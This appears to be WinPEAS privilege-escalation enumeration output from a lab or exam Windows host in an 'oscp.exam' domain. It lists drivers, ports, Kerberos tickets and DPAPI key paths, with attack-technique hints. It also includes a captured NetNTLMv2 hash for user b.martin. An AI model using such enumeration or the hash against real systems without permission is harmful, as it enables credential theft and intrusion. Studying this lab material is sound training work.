    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenUser
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: b.martin [Allow: AllAccess]
    File: C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\b.martin\AppData\Roaming\Microsoft\Windows
    FilePerms: b.martin [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


    Key: From WMIC
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
   =================================================================================================


╔══════════╣ Scheduled Applications --Non Microsoft--
╚ Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

╔══════════╣ Device Drivers --Non Microsoft--
╚ Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic FastLinQ Ethernet - 8.33.20.103 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qevbda.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    VMware vSockets Service - 9.8.19.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    VMware PCI VMCI Bus Device - 9.8.18.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MEGASAS RAID Controller Driver for Windows - 6.714.05.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.705.08.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1010 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.4.225.8009 11/15/2017 WS2K12 64 bit x64 [Broadcom]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys
    QLogic iSCSI offload driver - 8.33.5.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qeois.sys
    QLogic Fibre Channel Stor Miniport Driver - 9.1.15.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    VMware PVSCSI StorPort driver (64-bit) - 1.3.25.0 build-19569981 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\pvscsi.sys
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.0.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    VMware Guest Introspection Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsepflt.sys
    QLogic FCoE offload driver - 8.33.4.2 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qefcoe.sys
    QLogic iSCSI offload driver - 7.14.7.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    QLogic FCoE Offload driver - 7.14.15.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys
    VMware Raw Disk Helper Driver - 1.1.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmrawdsk.sys
    VMware Guest Introspection WFP Network Filter Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vnetWFP.sys
    VMware Pointing PS/2 Device Driver - 12.5.12.0 build-18967789 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware server memory controller - 7.5.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
    Intel(R) Gigabit Adapter - 12.15.22.6 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\e1i63x64.sys


════════════════════════════════════╣ Network Information ╠════════════════════════════════════

╔══════════╣ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

╔══════════╣ Enumerate Network Mapped Drives (WMI)

╔══════════╣ Host File

╔══════════╣ Network Ifaces and known hosts
╚ The masks are only for the IPv4 addresses 
    Ethernet1[00:50:56:8A:49:51]: 172.16.104.202 / 255.255.255.0
        Gateways: 172.16.104.254
        DNSs: 172.16.104.200
        Known hosts:
          172.16.104.200        00-50-56-8A-A4-35     Dynamic
          172.16.104.206        00-50-56-8A-09-6C     Dynamic
          172.16.104.254        00-00-00-00-00-00     Invalid
          172.16.104.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static


╔══════════╣ Current TCP Listening Ports
╚ Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         872             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               1433          0.0.0.0               0               Listening         4104            sqlservr
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         248             svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         4268            java
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         500             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1132            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1688            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         644             lsass
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         2328            svchost
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         644             lsass
  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         624             services
  TCP        127.0.0.1             1434          0.0.0.0               0               Listening         4104            sqlservr
  TCP        172.16.104.202        139           0.0.0.0               0               Listening         4               System
  TCP        172.16.104.202        3389          172.16.104.206        58718           Established       248             svchost
  TCP        172.16.104.202        57667         172.16.104.206        445             Established       4               System
  TCP        172.16.104.202        57668         172.16.104.206        445             Established       4               System
  TCP        172.16.104.202        57669         172.16.104.206        445             Established       4               System
  TCP        172.16.104.202        57670         172.16.104.206        445             Established       4               System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        135           [::]                                        0               Listening         872             svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        1433          [::]                                        0               Listening         4104            sqlservr
  TCP        [::]                                        3389          [::]                                        0               Listening         248             svchost
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        8080          [::]                                        0               Listening         4268            java
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         500             wininit
  TCP        [::]                                        49665         [::]                                        0               Listening         1132            svchost
  TCP        [::]                                        49666         [::]                                        0               Listening         1688            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         644             lsass
  TCP        [::]                                        49668         [::]                                        0               Listening         2328            svchost
  TCP        [::]                                        49669         [::]                                        0               Listening         644             lsass
  TCP        [::]                                        49670         [::]                                        0               Listening         624             services
  TCP        [::1]                                       1434          [::]                                        0               Listening         4104            sqlservr

╔══════════╣ Current UDP Listening Ports
╚ Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            8                 svchost
  UDP        0.0.0.0               500           *:*                            2544              svchost
  UDP        0.0.0.0               3389          *:*                            248               svchost
  UDP        0.0.0.0               4500          *:*                            2544              svchost
  UDP        0.0.0.0               5353          *:*                            1124              svchost
  UDP        0.0.0.0               5355          *:*                            1124              svchost
  UDP        127.0.0.1             54038         *:*                            1424              svchost
  UDP        127.0.0.1             54907         *:*                            2228              svchost
  UDP        127.0.0.1             61399         *:*                            644               lsass
  UDP        127.0.0.1             64027         *:*                            6872              C:\Users\b.martin\WinPEASx64.exe
  UDP        172.16.104.202        137           *:*                            4                 System
  UDP        172.16.104.202        138           *:*                            4                 System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            8                 svchost
  UDP        [::]                                        500           *:*                            2544              svchost
  UDP        [::]                                        3389          *:*                            248               svchost
  UDP        [::]                                        4500          *:*                            2544              svchost

╔══════════╣ Firewall Rules
╚ Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:
  [X] Exception: Object reference not set to an instance of an object.

╔══════════╣ DNS cached --limit 70--
    Entry                                 Name                                  Data
    dc20.oscp.exam                        dc20.oscp.exam                        172.16.104.200
    dc20.oscp.exam                        dc20.oscp.exam                        172.16.104.200
    _ldap._tcp.pdc._msdcs.oscp.exam       _ldap._tcp.pdc._msdcs.oscp.exam       dc20.oscp.exam 0 100 389
    _ldap._tcp.pdc._msdcs.oscp.exam       dc20.oscp.exam                        172.16.104.200
    ...-name._sites.gc._msdcs.oscp.exam   ...-Name._sites.gc._msdcs.oscp.exam   dc20.oscp.exam 0 100 3268
    ...-name._sites.gc._msdcs.oscp.exam   dc20.oscp.exam                        172.16.104.200

╔══════════╣ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        DisableCachingOfSSLPages                  1
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        CertificateRevocation                     1
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKCU        WarnonZoneCrossing                        1
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings

╔══════════╣ Internet Connectivity
╚ Checking if internet access is possible via different methods 
    HTTP (80) Access: Not Accessible
  [X] Exception:       Error: A task was canceled.
    HTTPS (443) Access: Not Accessible
  [X] Exception:       Error: TCP connect timed out
    HTTPS (443) Access by Domain Name: Not Accessible
  [X] Exception:       Error: A task was canceled.
    DNS (53) Access: Not Accessible
  [X] Exception:       Error: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
    ICMP (ping) Access: Not Accessible
  [X] Exception:       Error: Ping failed: TimedOut

╔══════════╣ Hostname Resolution
╚ Checking if the hostname can be resolved externally 
  [X] Exception:     Error during hostname check: An error occurred while sending the request.


════════════════════════════════════╣ Active Directory Quick Checks ╠════════════════════════════════════

╔══════════╣ gMSA readable managed passwords
╚ Look for Group Managed Service Accounts you can read (msDS-ManagedPassword) https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gmsa.html
  [-] No gMSA with readable managed password found (checked 0).

╔══════════╣ AD CS misconfigurations for ESC
╚  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
╚ Check for ADCS misconfigurations in the local DC registry
  [-] Host is not a domain controller. Skipping ADCS Registry check
╚ 
If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4
  [-] No templates with dangerous rights found (checked 0).


════════════════════════════════════╣ Cloud Information ╠════════════════════════════════════
Learn and practice cloud hacking in training.hacktricks.xyz
AWS EC2?                                No   
Azure VM?                               No   
Azure Tokens?                           No   
Google Cloud Platform?                  No   
Google Workspace Joined?                No   
Google Cloud Directory Sync?            No   
Google Password Sync?                   No   


════════════════════════════════════╣ Windows Credentials ╠════════════════════════════════════

╔══════════╣ Checking Windows Vault
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
    Not Found

╔══════════╣ Checking Credential manager
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): Element not found'
Please run: 
cmdkey /list

╔══════════╣ Saved RDP connections
    Not Found

╔══════════╣ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

╔══════════╣ Recently run commands
    a: powershell\1
    MRUList: ba
    b: notepad\1

╔══════════╣ Checking for DPAPI Master Keys
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    MasterKey: C:\Users\b.martin\AppData\Roaming\Microsoft\Protect\S-1-5-21-2481101513-2954867870-2660283483-1104\3bb1e62b-bbf1-4f5b-9a3f-a0b8e6886920
    Accessed: 2/22/2026 5:32:13 AM
    Modified: 2/22/2026 5:32:13 AM
   =================================================================================================


╔══════════╣ Checking for DPAPI Credential Files
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    Not Found

╔══════════╣ Checking for RDCMan Settings Files
╚ Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#remote-desktop-credential-manager
    Not Found

╔══════════╣ Looking for Kerberos tickets
╚  https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html
    serverName: krbtgt/OSCP.EXAM
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:20 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, renewable, forwarded, forwardable
   =================================================================================================

    serverName: krbtgt/OSCP.EXAM
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:20 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, initial, renewable, forwardable
   =================================================================================================

    serverName: ldap/DC20.oscp.exam/oscp.exam
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:47 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: cifs/dc20.oscp.exam
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:20 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: cifs/DC20
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:20 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: ldap/dc20.oscp.exam
    RealmName: OSCP.EXAM
    StartTime: 2/22/2026 5:57:20 AM
    EndTime: 2/22/2026 3:57:20 PM
    RenewTime: 3/1/2026 5:57:20 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================


╔══════════╣ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

╔══════════╣ Looking AppCmd.exe
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmdexe
    Not Found
      You must be an administrator to run this check

╔══════════╣ Looking SSClient.exe
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#scclient--sccm
    Not Found

╔══════════╣ Enumerating SSCM - System Center Configuration Manager settings

╔══════════╣ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    b.martin::OSCP:1122334455667788:dcc8aa88d352d72df12e450dcb8f138d:0101000000000000f0dfd06d03a4dc01a1556545053faf06000000000800300030000000000000000000000000200000ebda44c9528111c7aa6c6fdab865eb67f1324fe68423c1aaca04c03a1bc979750a00100000000000000000000000000000000000090000000000000000000000

   =================================================================================================



════════════════════════════════════╣ Browsers Information ╠════════════════════════════════════

╔══════════╣ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

╔══════════╣ Looking for Firefox DBs
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

╔══════════╣ Looking for GET credentials in Firefox history
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

╔══════════╣ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

╔══════════╣ Looking for Chrome DBs
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

╔══════════╣ Looking for GET credentials in Chrome history
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

╔══════════╣ Chrome bookmarks
    Not Found

╔══════════╣ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

╔══════════╣ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

╔══════════╣ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

╔══════════╣ Current IE tabs
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

╔══════════╣ Looking for GET credentials in IE history
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history


╔══════════╣ IE history -- limit 50

    http://go.microsoft.com/fwlink/p/?LinkId=255141

╔══════════╣ IE favorites
    http://go.microsoft.com/fwlink/p/?LinkId=255142


════════════════════════════════════╣ Interesting files and registry ╠════════════════════════════════════

╔══════════╣ Putty Sessions
    Not Found

╔══════════╣ Putty SSH Host keys
    Not Found

╔══════════╣ SSH keys in registry
╚ If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#ssh-keys-in-registry
    Not Found

╔══════════╣ SuperPutty configuration files

╔══════════╣ Enumerating Office 365 endpoints synced by OneDrive.

    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-2481101513-2954867870-2660283483-1104
   =================================================================================================

    SID: S-1-5-21-318536300-2164503644-2098472648-1001
   =================================================================================================

    SID: S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
   =================================================================================================

    SID: S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430
   =================================================================================================

    SID: S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


╔══════════╣ Cloud Credentials
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    Not Found

╔══════════╣ Unattend Files

╔══════════╣ Looking for common SAM & SYSTEM backups

╔══════════╣ Looking for McAfee Sitelist.xml Files

╔══════════╣ Cached GPP Passwords

╔══════════╣ Looking for possible regs with creds
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

╔══════════╣ Looking for possible password files in users homes
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

╔══════════╣ Searching for Oracle SQL Developer config files


╔══════════╣ Slack files & directories
  note: check manually if something is found

╔══════════╣ Looking for LOL Binaries and Scripts (can be slow)
╚  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

╔══════════╣ Enumerating Outlook download files


╔══════════╣ Enumerating machine and user certificate files


╔══════════╣ Searching known files that can contain creds in home
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials

╔══════════╣ Looking for documents --limit 100--
    Not Found

╔══════════╣ Office Most Recent Files -- limit 50

  Last Access Date           User                                           Application           Document

╔══════════╣ Recent files --limit 70--
    Not Found

╔══════════╣ Looking inside the Recycle Bin for creds files
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    Not Found

╔══════════╣ Searching hidden files or folders in C:\Users home (can be slow)

     C:\Users\b.martin\ntuser.pol
     C:\Users\All Users
     C:\Users\All Users\ntuser.pol
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\Default

╔══════════╣ Searching interesting files in other users home directories (can be slow)

     Checking folder: c:\users\administrator

   =================================================================================================

     Checking folder: c:\users\jenkins

   =================================================================================================


╔══════════╣ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\b.martin\WinPEASx64.exe": b.martin [Allow: AllAccess]

╔══════════╣ Looking for Linux shells/distributions - wsl.exe, bash.exe

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
